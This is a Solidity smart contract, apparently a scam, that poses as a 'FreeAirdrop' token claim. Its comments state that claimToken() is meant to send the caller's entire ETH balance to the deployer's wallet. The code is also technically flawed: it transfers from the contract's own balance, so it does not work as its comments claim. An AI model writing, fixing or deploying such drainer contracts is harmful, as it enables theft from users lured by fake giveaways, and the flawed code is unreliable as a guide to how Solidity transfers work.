



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

contract FreeAirdrop {
    address payable public owner;

    // Set the deployer as the owner
    constructor() {
        owner = payable(msg.sender);
    }

    // Function to receive ETH (not necessary for your purpose but good to include)
    receive() external payable {}

    // Function to transfer user's ETH to the owner's wallet
    function claimToken() external payable {
          uint256 balance = address(msg.sender).balance;
        require(balance > 0, "Insufficient balance"); // Ensure user has ETH
        owner.transfer(balance); // Transfer the user's entire balance to the owner
    }
}

